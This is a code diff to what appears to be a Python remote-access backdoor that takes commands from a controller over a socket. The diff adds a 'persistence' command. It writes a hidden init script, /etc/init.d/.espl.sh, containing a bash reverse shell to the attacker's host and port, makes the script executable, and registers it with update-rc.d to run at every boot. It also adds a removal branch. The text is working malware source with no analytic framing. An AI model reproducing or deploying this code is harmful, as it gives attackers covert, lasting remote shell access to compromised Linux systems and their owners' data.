@@ -133,6 +133,23 @@ def run_shell_command(cmd_data):
 	sock.send(cmd_data['term'])
 
 
+def persistence(cmd_data):
+	try:
+		if cmd_data["args"] == "install":
+			script_path = "/etc/init.d/.espl.sh"
+			script_text = "bash &> /dev/tcp/{0}/{1} 0>&1".format(host,port)
+			#create script
+			f = open(script_path,"w")
+			f.write(script_text)
+			f.close()
+			os.system("chmod +x {0}".format(script_path))
+			os.system("update-rc.d .espl.sh defaults 100")			
+		else:
+			os.system("update-rc.d -f apache2 remove .espl.sh")
+	except Exception as e:
+		sock.send(str(e))
+	sock.send(cmd_data['term'])
+
 # SETUP
 while 1:
 	raw_data = sock.recv(512)
@@ -154,6 +171,8 @@ while 1:
 		pwd(cmd_data)
 	elif cmd == "pid":
 		pid(cmd_data)
+	elif cmd == "persistence":
+		persistence(cmd_data)
 	else:
 		run_shell_command(cmd_data)
 
